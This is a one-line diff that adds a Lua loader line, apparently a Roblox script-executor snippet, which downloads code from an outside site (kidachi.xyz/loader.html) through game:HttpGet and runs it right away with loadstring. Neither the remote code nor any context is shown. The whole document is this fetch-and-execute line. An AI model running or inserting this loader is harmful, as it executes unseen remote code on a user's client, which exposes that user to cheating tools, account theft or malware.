@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://kidachi.xyz/loader.html', true))()
